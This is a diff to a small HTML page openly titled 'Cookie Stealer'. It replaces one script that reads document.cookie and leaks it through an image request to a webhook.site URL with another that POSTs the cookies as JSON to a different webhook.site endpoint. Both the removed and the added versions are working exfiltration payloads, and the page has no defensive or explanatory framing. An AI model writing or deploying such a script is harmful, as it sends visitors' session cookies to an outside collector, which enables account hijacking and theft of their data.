@@ -1,19 +1,32 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Steal All Cookies</title>
-    <script>
-        // Retrieve all cookies
-        var cookies = document.cookie;
-        
-        // Send all cookies to your webhook server
-        var img = new Image();
-        img.src = `https://webhook.site/91949cf1-8886-45e6-acf0-3f10004fd35f/steal?cookies=${encodeURIComponent(cookies)}`;
-    </script>
+  <title>Cookie Stealer</title>
 </head>
 <body>
-    <h1>Stealing All Cookies...</h1>
+  <h1>Checking for cookies...</h1>
+  <script>
+    const cookies = document.cookie;
+    console.log("Found cookies:", cookies);
+
+    const webhookURL = 'https://webhook.site/be8207e9-fda6-4721-87a4-b2f41d965ac2';
+
+    // Send the cookies to the webhook.site URL
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({ cookies: cookies })
+    })
+    .then(response => {
+      console.log("Cookie sent to webhook.site");
+      document.body.innerHTML += "<p>Cookie sent to webhook.site!</p>";
+    })
+    .catch(error => {
+      console.error("Error sending cookie:", error);
+      document.body.innerHTML += "<p>Error sending cookie.</p>";
+    });
+  </script>
 </body>
 </html>
